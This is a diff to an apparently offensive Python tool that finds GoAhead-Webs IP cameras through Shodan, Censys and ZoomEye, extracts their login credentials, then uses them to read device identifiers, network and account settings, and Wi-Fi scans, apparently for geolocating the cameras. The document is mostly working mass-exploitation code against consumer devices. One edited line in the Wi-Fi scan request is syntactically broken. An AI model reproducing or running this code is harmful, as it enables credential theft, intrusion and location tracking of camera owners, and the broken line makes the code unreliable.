@@ -53,9 +53,9 @@ Zoom_CREDS = ['', '']   # ZoomeEye [User, Pwd]
 
 
 # Feeder Queries cfg
-SHODAN_query = 'Server: GoAhead-Webs opaque="5ccc069c403ebaf9f0171e9517f40e41"'
-SHODAN_STREAM_query = ['Server: GoAhead-Webs',
-                       'opaque="5ccc069c403ebaf9f0171e9517f40e41"']
+SHODAN_query = ['Server: GoAhead-Webs opaque="5ccc069c403ebaf9f0171e9517f40e41"']
+SHODAN_STREAM_query = [['Server: GoAhead-Webs',
+                       'opaque="5ccc069c403ebaf9f0171e9517f40e41"']]
 Censys_query = 'GoAhead-Webs and opaque=\"5ccc069c403ebaf9f0171e9517f40e41\"'
 Zoom_query = '+headers:"GoAhead-Webs" +headers:"opaque=\\\"5ccc069c403ebaf9f0171e9517f40e41\\\""'
 
@@ -73,30 +73,22 @@ GoogleGeocodURL = 'https://maps.googleapis.com/maps/api/geocode/json?language=en
 GoogleGeolocHEADER = {'Content-Type': 'application/json',
                       'Cache-Control': 'no-cache'}
 
-pat_wifi = re_compile(r'^(.+)\[(\d+)\][ ]*=[\"\']?([\w:\-]+?)[\"\']?;')
+pat_wifi = re_compile(r'^(.+)\[(\d+)\][ ]*=["\']?([\w:\-]+?)["\']?;')
 patn_wifi = re_compile(r'var ap_number=([\d]+?);')
 pat_result = re_compile(r'var result="([\w\s]+?)";')
-pat_smarteye = re_compile(r'var se_ddns_?(.+)=[\"]?(.*?)[\"]?;')
-pat_oppolink = re_compile(r'var (.+)=[\"]?(.*?)[\"]?;')
-pat_wifiap = re_compile(r'var wifi_(.+)=[\"]?([\w:\-\.\s]*?)[\"]?;')
-cred_types = ['loginuser', 'loginpass']
+pat_smarteye = re_compile(r'var se_ddns_?(.+)=["]?(.*?)["]?;')
+pat_oppolink = re_compile(r'var (.+)=["]?(.*?)["]?;')
+pat_wifiap = re_compile(r'var wifi_(.+)=["]?([\w:\-\.\s]*?)["]?;')
+
 data_types = ['alias', 'mac', 'wifimac', 'deviceid', 'sys_ver',
-              'app_version', 'oem_id', 'sdstatus', 'syswifi_mode']
+              'app_version', 'oem_id', 'id', 'sdstatus', 'syswifi_mode']
 param_types = {'ddns', 'ftp', 'mail', 'user', 'wifi'}
 
-patcredV = []
-for cred_i in cred_types:
-    patcredV.append(re_compile(r'var %s=[\"]([\S\s]+?)[\"];' % (cred_i)))
+patcredV = [re_compile(r'var %s="([\S\s]*?)";' % (cred_i)) for cred_i in ['loginuser', 'loginpass']]
 
-patdataV = {}
-for data_i in data_types:
-    patdataV[data_i] = re_compile(
-        r'var %s=[\"]?([\w:\-\.]*?)[\"]?;' % (data_i))
+patdataV = {data_i: re_compile(r'var %s=["]?([\w:\-\.]*?)["]?;' % (data_i)) for data_i in data_types}
 
-pat_paramjsV = {}
-for param_i in param_types:
-    pat_paramjsV[param_i] = re_compile(
-        r'var %s_?(.+)=[\"]?(.*?)[\"]?;' % (param_i))
+pat_paramjsV = {param_i: re_compile(r'var %s_?(.+)=["]?(.*?)["]?;' % (param_i)) for param_i in param_types}
 
 # PwnProc and GeoProc cfg
 DBM0_Comp = -120.0  # DBM0 Compensation
@@ -284,44 +276,46 @@ class ShodanProc(FeederBase):
 
         self.myprint('Process starting')
         self.workers = [sw_p for sw_p in self.workers if sw_p.getFlag()]
-        ok = False
-        while(not ok):
-            try:
-                # Search Shodan
-                if self.country is not None:
-                    count = self.api.count(
-                        SHODAN_query + ' country:"%s"' % (self.country))
-                else:
-                    count = self.api.count(SHODAN_query)
-                ok = True
-            except shodan.APIError as e:
-                self.myprint('Error: %s' % e)
-                sleep(SHODAN_sleep + random() * SHODAN_sleep)
 
-        # Show the results
-        self.myprint('Results found: %s' % count['total'])
+        for query in SHODAN_query:
+            # For each fingerprint
+            ok = False
+            while(not ok):
+                try:
+                    # Search Shodan
+                    if self.country is not None:
+                        # , facets=facets)
+                        count = self.api.count(
+                            query + ' country:"%s"' % (self.country))
+                    else:
+                        count = self.api.count(query)
+                    ok = True
+                except shodan.APIError as e:
+                    self.myprint('Error: %s' % e)
+                    sleep(SHODAN_sleep + random() * SHODAN_sleep)
 
-        # Generate workers
-        if count['total'] > 0:
-            tpages = ceil(count['total'] / 100)
-            tworkers = ceil(tpages / 100)
-            for i in range(tworkers):
-                sw_p = ShodanWorker(self.threadID, i, self.feedingQueue, self.country, range(
-                    i, tpages + 1, tworkers), self.tokenBucket, self.haltTB)
-                self.workers.append(sw_p)
-                sw_p.start()
-                sleep(SHODAN_span)
+            # Show the results
+            self.myprint('Results found: %s' % count['total'])
+
+            # Generate workers
+            if count['total'] > 0:
+                tpages = ceil(count['total'] / 100)
+                tworkers = ceil(tpages / 100)
+                for i in range(tworkers):
+                    sw_p = ShodanWorker(self.threadID, len(self.workers), self.feedingQueue, self.country,
+                            query, range(i, tpages + 1, tworkers), self.tokenBucket, self.haltTB)
+                    self.workers.append(sw_p)
+                    sw_p.start()
+                    sleep(SHODAN_span)
 
         while len(self.workers) != 0:
-            self.workers = [
-                sw_p for sw_p in self.workers if sw_p.getFlag() and sw_p.is_alive()]
+            self.workers = [sw_p for sw_p in self.workers if sw_p.getFlag() and sw_p.is_alive()]
             ulock = [[sw_p.getID(), kill(sw_p.pid, SIGALRM)]
                      for sw_p in self.workers if sw_p.beat() == 0]
             if len(ulock) != 0:  # Unlocking hanged processes
                 self.myprint('Unlocking worker %s' %
                              ([sw_p[0] for sw_p in ulock]))
-            self.workers = [
-                sw_p for sw_p in self.workers if sw_p.getFlag() and sw_p.is_alive()]
+            self.workers = [sw_p for sw_p in self.workers if sw_p.getFlag() and sw_p.is_alive()]
             self.workersN.value = len(self.workers)  # Update shared value
 
             try:
@@ -359,16 +353,18 @@ class ShodanWorker(ShodanProc):
     """ShodanWorker downloads up to 100 pages from Shodan and pushes the new camera candidates to the feeding queue
     Priority in feeding queue is 1 for pages < 200 and 2 for the rest"""
 
-    worker = ""
+    worker = ''
+    wquery = ''
     wrange = None
     heartBeat = None
 
-    def __init__(self, tID, w, q, country, r, tB, hTB):
+    def __init__(self, tID, w, q, country, query, r, tB, hTB):
         """ShodanWorker init function, defines parent id, id, feeding queue, country, page number generator, and tocken bucket queue"""
 
         ShodanProc.__init__(self, tID, q, country)
         self.worker = w
         self.wrange = r
+        self.wquery = query
         self.tokenBucket = tB
         self.haltTB = hTB
         self.heartBeat = Value('i', heartBeat[2])
@@ -392,13 +388,13 @@ class ShodanWorker(ShodanProc):
                     self.resetHB()
                     if self.country is not None:
                         page = self.api.search(
-                            SHODAN_query + ' country:"%s"' % (self.country), page=i + 1)
+                            self.wquery + ' country:"%s"' % (self.country), page=i + 1)
                     else:
-                        page = self.api.search(SHODAN_query, page=i + 1)
+                        page = self.api.search(self.wquery, page=i+1)
                     self.resetHB()
                     h_counter = [0, 0, 0]  # [new, online, offline]
-                    self.myprint('Query %s: %s hosts' %
-                                 (str(i + 1), len(page['matches'])))
+                    self.myprint('Query <%s> -%s: %s hosts' %
+                                 (self.wquery, str(i + 1), len(page['matches'])))
                     if len(page['matches']) != 0:
                         ok = True
                         lvl = 2 if i > 200 else 1  # Priotising last results
@@ -406,8 +402,8 @@ class ShodanWorker(ShodanProc):
                             h_counter[self.checkAndSubmit(
                                 host['ip_str'], int(host['port']), lvl)] += 1
                             sleep(0.1)  # Reduce DB overload
-                        self.myprint('Result of query %s: %s hosts [%s new, %s online, %s offline]' % (
-                            str(i + 1), len(page['matches']), h_counter[0], h_counter[1], h_counter[2]))
+                        self.myprint('Result of query <%s> -%s: %s hosts [%s new, %s online, %s offline]' % (
+                            self.wquery, str(i + 1), len(page['matches']), h_counter[0], h_counter[1], h_counter[2]))
                     else:  # Very uncommon exception
                         nq += 1
                 except shodan.APIError as e:
@@ -485,12 +481,14 @@ class ShodanStreamProc(FeederBase):
         while self.runFlag.value:
             try:
                 for host in self.api.stream.banners():
-                    if not False in [q in host.get('data', '') for q in SHODAN_STREAM_query]:
+                    for query in SHODAN_STREAM_query:
+                        if not False in [q in host.get('data', '') for q in query]:
 
-                        h_counter[self.checkAndSubmit(host.get('ip_str', host.get(
-                            'ipv6', '0.0.0.0')), int(host.get('port', 0)), 0)] += 1
-                        self.myprint('Result: %s hosts [%s new, %s online, %s offline]' % (
-                            sum(h_counter), h_counter[0], h_counter[1], h_counter[2]))
+                            h_counter[self.checkAndSubmit(host.get('ip_str', host.get(
+                                'ipv6', '0.0.0.0')), int(host.get('port', 0)), 0)] += 1
+                            self.myprint('Result: %s hosts [%s new, %s online, %s offline]' % (
+                                sum(h_counter), h_counter[0], h_counter[1], h_counter[2]))
+                            break
 
                     if not self.runFlag.value:  # Halt
                         break
@@ -913,7 +911,7 @@ class PwnProc(Process):
                     else:
                         Address._create(camera, ts, protocam.ip, protocam.port)
 
-                    if len(params['user']) == 0:
+                    if len(params['user']) == 0 or [params['user'].get('3_name', None), params['user'].get('3_pwd', None)] != protocam.creds:
                         params['user'] = {
                             '3_name': protocam.creds[0],
                             '3_pwd': protocam.creds[1]}
@@ -1082,9 +1080,13 @@ class PwnProc(Process):
                             if patcred_i.search(rsp):
                                 creds.append(patcred_i.search(rsp).group(1))
                             else:
-                                creds.append('')
-                        if self.test_creds(protocam, creds) == 200:
+                                creds.append(None)
+                        rst = self.test_creds(protocam, creds)
+                        if rst == 200:
                             return creds
+                        else:
+                            self.myprint(
+                                'Got creds %s but with result %s' % (str(creds), rst))
                     else:
                         self.myprint(
                             'Error status code %s requesting %s' % (c.status, payload))
@@ -1116,9 +1118,9 @@ class PwnProc(Process):
             if x != 0:
                 sleep(network_sleep)
             try:
-                if creds[0] != '':
-                    r = self.timed_get('http://%s:%s/' %
-                                       (protocam.ip, protocam.port), creds)
+                if None not in creds:
+                    r = self.timed_get('http://%s:%s/get_status.cgi?loginuse=%s&loginpas=%s' % (
+                        protocam.ip, protocam.port, *creds), creds)
                     return r.status_code
                 else:
                     return 401
@@ -1163,10 +1165,8 @@ class PwnProc(Process):
             if x != 0:
                 sleep(network_sleep)
             try:
-                self.timed_get('http://%s:%s/get_status.cgi?loginuse=%s&loginpas=%s' % (protocam.ip,
-                                                                                        protocam.port, protocam.creds[0], protocam.creds[1]), protocam.creds)  # Force params reload
                 r = self.timed_get('http://%s:%s/get_status.cgi?loginuse=%s&loginpas=%s' % (
-                    protocam.ip, protocam.port, protocam.creds[0], protocam.creds[1]), protocam.creds)
+                    protocam.ip, protocam.port, *protocam.creds), protocam.creds)
                 if r.status_code == 200:
                     mydata = {}
                     #[Alias, MAC, WIFIMAC, ID, SYS_VER,SD]
@@ -1176,9 +1176,12 @@ class PwnProc(Process):
                                 r.text).group(1)
                     if len(mydata) != 0:
                         # SaFety
+                        if not 'deviceid' in mydata.keys() and 'id' in mydata.keys():
+                            mydata['deviceid'] = mydata['id']
+                            del mydata['id']
                         for data in data_types[0:7]:
                             mydata[data] = mydata.get(data, '')
-                        for data in data_types[7:9]:
+                        for data in data_types[8:10]:
                             mydata[data] = mydata.get(data, -1)
                         return mydata
                     else:
@@ -1206,7 +1209,7 @@ class PwnProc(Process):
                     mydata[param_i] = {}
 
                 r = self.timed_get('http://%s:%s/get_params.cgi?loginuse=%s&loginpas=%s' % (
-                    protocam.ip, protocam.port, protocam.creds[0], protocam.creds[1]), protocam.creds)
+                    protocam.ip, protocam.port, *protocam.creds), protocam.creds)
                 if r.status_code == 200:
                     for line in r.text.split('\n'):
                         for param_i in param_types:
@@ -1242,7 +1245,7 @@ class PwnProc(Process):
             try:
                 smartdata = {}
                 r = self.timed_get('http://%s:%s/get_smarteye.cgi?loginuse=%s&loginpas=%s' % (
-                    protocam.ip, protocam.port, protocam.creds[0], protocam.creds[1]), protocam.creds)
+                    protocam.ip, protocam.port, *protocam.creds), protocam.creds)
                 if r.status_code == 200:
                     for line in r.text.split('\n'):
                         if pat_smarteye.search(line):
@@ -1274,11 +1277,11 @@ class PwnProc(Process):
                 # Sometimes the scan doesn't start at the first try
                 while((len(mylist) == 0) and i < scan_retries):
                     if protocam.b64 or protocam.b64 is None:  # To Check
-                        r1 = self.timed_get('http://%s:%s/wifi_scan.cgi?loginuse=%s&loginpas=%s' % (protocam.ip, protocam.port, b64encode(bytes(
-                            protocam.creds[0], 'utf-8')).decode('utf-8'), b64encode(bytes(protocam.creds[1], 'utf-8')).decode('utf-8')), protocam.creds)
+                        r1 = self.timed_get('http://%s:%s/wifi_scan.cgi?loginuse=%s&loginpas=%s' % (protocam.ip, protocam.port,
+                            *[b64encode(bytes(cred, 'utf-8')).decode('utf-8') for cred in protocam.creds], 'utf-8')).decode('utf-8')), protocam.creds)
                     else:
                         r1 = self.timed_get('http://%s:%s/wifi_scan.cgi?loginuse=%s&loginpas=%s' % (
-                            protocam.ip, protocam.port, protocam.creds[0], protocam.creds[1]), protocam.creds)
+                            protocam.ip, protocam.port, *protocam.creds), protocam.creds)
                     i += 1
                     if r1.status_code == 200:
                         if pat_result.search(r1.text):
@@ -1288,7 +1291,7 @@ class PwnProc(Process):
                         sleep(scan_wait)
                         self.myprint("Waited scan %s" % (i))
                         r2 = self.timed_get('http://%s:%s/get_wifi_scan_result.cgi?loginuse=%s&loginpas=%s' % (
-                            protocam.ip, protocam.port, protocam.creds[0], protocam.creds[1]), protocam.creds)
+                            protocam.ip, protocam.port, *protocam.creds), protocam.creds)
                         self.myprint("Got scan %s" % (i))
                         if r2.status_code == 200 and patn_wifi.search(r2.text):
                             if pat_result.search(r2.text):
